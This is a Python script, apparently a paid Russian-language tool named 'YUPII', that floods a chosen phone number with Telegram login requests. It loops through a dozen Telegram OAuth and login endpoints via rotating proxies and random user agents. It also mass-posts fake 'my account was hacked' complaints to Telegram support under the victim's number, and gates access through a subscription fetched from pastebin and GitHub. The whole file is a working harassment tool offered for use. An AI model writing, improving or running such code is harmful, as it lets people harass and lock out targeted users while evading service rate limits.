from rich import print
from rich.console import Console
from rich.panel import Panel
from rich.progress import Progress, SpinnerColumn, TextColumn
from rich.text import Text

import requests
from fake_useragent import UserAgent
import csv
import sys
import logging
import random
import string
from datetime import datetime
from itertools import cycle
import time
import pyfiglet
from termcolor import colored

# Отключаем логирование сторонних библиотек
logging.getLogger().setLevel(logging.CRITICAL)
requests.packages.urllib3.disable_warnings()

console = Console()

# === ASCII-БАННЕР ПРИВЕТСТВИЯ ===
def show_banner():
    banner = pyfiglet.figlet_format("YUPII")
    colored_banner = colored(banner, color='magenta')
    console.print(Panel(Text(colored_banner), border_style="magenta", title="Добро пожаловать"))

# === ФУНКЦИЯ АНІМАЦИИ ===
def ascii_animation(delay: float = 0.005):
    art = r'''
 .S_SSSs    S.        sSSs_sSSs      sSSSSs    sSSs   .S_sSSs
.SSYS%%b    d%%%%SP   d%%SP  .SSSP  S&S    S&S
S&S    S&S  S&S     S&S       S&S  S&S sSSs  S&S     S&S    S&S
SS    S&S  Sb     Sb       dS  Sb `S%%  Sb     SS    SS
SS    SS  SS.    SS.     .SS  SS   S%  SS.    SS    SS
SS    SS   SSSbs   SSSbs_sdSSS    SS_sSSS   SSSbs  SS    SS
SSS    SS    YSSP    YSSPYSSY    YSSP  S*S    SSS
SP                                            SP
Y                                             Y
'''
    panel = Panel.fit(Text(art, style="green"), border_style="bright_green", title="Запуск утилиты")
    console.print(panel)

# === СПИСОК TELEGRAM/OAUTH ЦЕЛЕЙ ===
TELEGRAM_ENDPOINTS = [
    'https://oauth.telegram.org/auth/request?bot_id=1852523856&origin=https%3A%2F%2Fcabinet.presscode.app&embed=1&return_to=https%3A%2F%2Fcabinet.presscode.app%2Flogin',
    'https://translations.telegram.org/auth/request',
    'https://oauth.telegram.org/auth/request?bot_id=1093384146&origin=https%3A%2F%2Foff-bot.ru&embed=1&request_access=write&return_to=https%3A%2F%2Foff-bot.ru%2Fregister%2Fconnected-accounts%2Fsmodders_telegram%2F%3Fsetup%3D1',
    'https://oauth.telegram.org/auth/request?bot_id=466141824&origin=https%3A%2F%2Fmipped.com&embed=1&request_access=write&return_to=https%3A%2F%2Fmipped.com%2Ff%2Fregister%2Fconnected-accounts%2Fsmodders_telegram%2F%3Fsetup%3D1',
    'https://oauth.telegram.org/auth/request?bot_id=5463728243&origin=https%3A%2F%2Fwww.spot.uz&return_to=https%3A%2F%2Fwww.spot.uz%2Fru%2F2022%2F04%2F29%2Fyoto%2F%23',
    'https://oauth.telegram.org/auth/request?bot_id=1733143901&origin=https%3A%2F%2Ftbiz.pro&embed=1&request_access=write&return_to=https%3A%2F%2Ftbiz.pro%2Flogin',
    'https://oauth.telegram.org/auth/request?bot_id=319709511&origin=https%3A%2F%2Ftelegrambot.biz&embed=1&return_to=https%3A%2F%2Ftelegrambot.biz%2F',
    'https://oauth.telegram.org/auth/request?bot_id=1199558236&origin=https%3A%2F%2Fbot-t.com&embed=1&return_to=https%3A%2F%2Fbot-t.com%2Flogin',
    'https://oauth.telegram.org/auth/request?bot_id=1803424014&origin=https%3A%2F%2Fru.telegram-store.com&embed=1&request_access=write&return_to=https%3A%2F%2Fru.telegram-store.com%2Fcatalog%2Fsearch',
    'https://oauth.telegram.org/auth/request?bot_id=210944655&origin=https%3A%2F%2Fcombot.org&embed=1&request_access=write&return_to=https%3A%2F%2Fcombot.org%2Flogin',
    'https://my.telegram.org/auth/send_password',
    'https://oauth.telegram.org/auth?bot_id=5444323279&origin=https%3A%2F%2Ffragment.com&request_access=write&return_to=https%3A%2F%2Ffragment.com%2F',
    'https://oauth.telegram.org/auth?bot_id=531675494&origin=https%3A%2F%2Ftelegram.org&embed=1&request_access=write&return_to=https%3A%2F%2Ftelegram.org%2Fblog%2Flogin%3Fsetln%3Dru'
]

# === URL КОНФИГА ПОДПИСКИ ===
CONFIG_URLS = [
    'https://pastebin.com/raw/rzZYPmxX',
    'https://raw.githubusercontent.com/weltydev1/Hhhb/refs/heads/main/Keys.tx5?token=GHSAT0AAAAAADDCCXPBCZIHB3SPAZAAJUFW2ARLUYQ'
]

def fetch_subscription_config(urls):
    last_error = None
    for url in urls:
        try:
            resp = requests.get(url, timeout=10, verify=False)
            resp.raise_for_status()
            text = resp.text.strip()
            if not text:
                raise ValueError("Пустой ответ от конфигурации")

            lines = [l.strip() for l in text.splitlines() if l.strip()]
            if len(lines) >= 3:
                login_cfg, key_cfg, date_str = lines[:3]
            else:
                parts = [p.strip() for p in text.replace(';', ',').split(',') if p.strip()]
                if len(parts) == 3:
                    login_cfg, key_cfg, date_str = parts
                else:
                    raise ValueError("Неверный формат данных подписки")

            exp_date = datetime.strptime(date_str, '%d.%m.%Y').date()
            return login_cfg, key_cfg, exp_date

        except Exception as e:
            last_error = e
    console.print(Panel(f"Ошибка загрузки конфига подписки:\n{last_error}", border_style="red", title="Ошибка"))
    sys.exit(1)


def check_subscription():
    login_cfg, key_cfg, exp_date = fetch_subscription_config(CONFIG_URLS)
    console.print(Panel("Введите данные подписки:", border_style="cyan", title="Авторизация"))
    login_in = console.input("Login: ").strip()
    key_in = console.input("Key: ").strip()
    today = datetime.now().date()

    if login_in != login_cfg or key_in != key_cfg:
        console.print(Panel("Неверный логин или ключ.", border_style="red", title="Доступ запрещён"))
        sys.exit(1)
    if today > exp_date:
        console.print(Panel(f"Срок подписки истёк {exp_date.strftime('%d.%m.%Y')}", border_style="red", title="Истёк срок"))
        sys.exit(1)

    console.print(Panel(f"Подписка активна до {exp_date.strftime('%d.%m.%Y')}", border_style="green", title="Успех"))


def load_proxies_from_url(url: str):
    proxies = []
    try:
        resp = requests.get(url, timeout=10, verify=False)
        resp.raise_for_status()
        lines = resp.text.strip().splitlines()
        reader = csv.reader(lines, delimiter=' ')
        for row in reader:
            if len(row) == 2:
                ip_port, login_pass = row
                ip, port = ip_port.split(':')
                login, password = login_pass.split(':')
                url_proxy = f"http://{login}:{password}@{ip}:{port}"
            elif len(row) == 1:
                ip_port = row[0]
                url_proxy = f"http://{ip_port}"
            else:
                continue
            proxies.append({'http': url_proxy, 'https': url_proxy})
    except Exception as e:
        console.print(Panel(f"Ошибка загрузки прокси:\n{e}", border_style="red", title="Ошибка"))
        sys.exit(1)
    return proxies


def generate_phone_number():
    codes = ['+7', '+380', '+375']
    return random.choice(codes) + ''.join(random.choices(string.digits, k=10))


def generate_random_email():
    domains = ["gmail.com", "yahoo.com", "outlook.com", "hotmail.com", "mail.ru"]
    user = ''.join(random.choice(string.ascii_lowercase) for _ in range(8))
    return f"{user}@{random.choice(domains)}"


def send_complaints(phone: str, repeats: int, proxies: list):
    ua = UserAgent()
    msg = ("Здравствуйте, я утерял свой телеграм-аккаунт путём взлома. "
           "Прошу помощи: мой номер — {phone}.")
    for i in range(repeats):
        proxy = random.choice(proxies) if proxies else None
        headers = {"User-Agent": ua.random}
        try:
            requests.post(
                'https://telegram.org/support',
                headers=headers,
                data={'issue': msg, 'phone': phone},
                proxies=proxy,
                timeout=10,
                verify=False
            )
        except:
            continue


def main():
    check_subscription()
    show_banner()
    ascii_animation()

    proxies = load_proxies_from_url('https://pastebin.com/raw/XAjPVwDL')
    proxy_cycle = cycle(proxies)
    ua = UserAgent()

    phone = console.input("Введите номер телефона (+7...): ").strip() or generate_phone_number()
    console.print(f"Используем номер: [bold green]{phone}[/bold green]")

    count_input = console.input("Сколько итераций запросов? (0 для бесконечного режима): ").strip() or '0'
    try:
        total_requests = int(count_input)
    except ValueError:
        total_requests = 0
    complaint_count = int(console.input("Сколько жалоб отправить? ").strip() or '0')
    cycle_limit = 12

    console.print(Panel(f"Начинаем: {('бесконечно' if total_requests == 0 else total_requests)} итераций и {complaint_count} жалоб", border_style="blue", title="Старт"))

    with Progress(SpinnerColumn(), TextColumn("{task.description}"), transient=True) as prog:
        task = prog.add_task("Отправка запросов", start=False)
        sent = 0
        try:
            while True:
                if total_requests and sent >= total_requests:
                    break
                proxy = next(proxy_cycle) if proxies else None
                headers = {'User-Agent': ua.random}
                if proxies and sent and sent % cycle_limit == 0:
                    console.print(f"[yellow]Прокси обновлён: {proxy['http']}[/yellow]")

                prog.start_task(task)
                for url in TELEGRAM_ENDPOINTS:
                    try:
                        requests.post(
                            url,
                            headers=headers,
                            data={'phone': phone},
                            proxies=proxy,
                            timeout=10,
                            verify=False
                        )
                    except:
                        continue
                prog.stop_task(task)

                sent += 1
                console.print(f"[green][{sent}] запрос(ы) отправлены через {proxy['http'] if proxy else 'без proxy'}[/green]")

        except KeyboardInterrupt:
            console.print(Panel("Работа прервана пользователем.", border_style="yellow", title="Стоп"))

    if complaint_count > 0:
        console.print(Panel("Отправка жалоб...", border_style="magenta", title="Жалобы"))
        send_complaints(phone, complaint_count, proxies)
        console.print(Panel(f"Жалобы отправлены: {complaint_count}", border_style="green", title="Готово"))

if __name__ == '__main__':
    main()
